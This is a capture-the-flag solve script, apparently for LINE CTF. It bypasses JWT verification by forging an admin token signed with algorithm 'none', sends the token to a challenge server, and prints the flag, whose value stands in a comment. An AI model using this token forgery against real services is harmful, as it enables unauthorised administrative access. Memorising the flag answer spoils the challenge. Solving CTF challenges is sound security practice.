guest_jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.rUKzvxAwpuro6UF6KETwbMPCLBsPGUScjSEZtQGjfX4'.split('.')

#from base64 import b64decode
#[print(b64decode(guest_jwt[i]).decode()) for i in range(2)]
'''
{"alg":"HS256"}
{"sub":"guest"}
'''

import jwt
payload = jwt.encode({'sub': 'admin'}, '', algorithm='none')
#print(f'[+] Payload: {payload}')

import urllib.request as requests
URL = 'http://34.84.28.50:10000'

req = requests.Request(f'{URL}/?j={payload}')
res = requests.urlopen(req)
html_res = res.read().decode()

import re
print(re.findall("LINECTF{.*?}", html_res)[0])
#LINECTF{337e737f9f2594a02c5c752373212ef7}
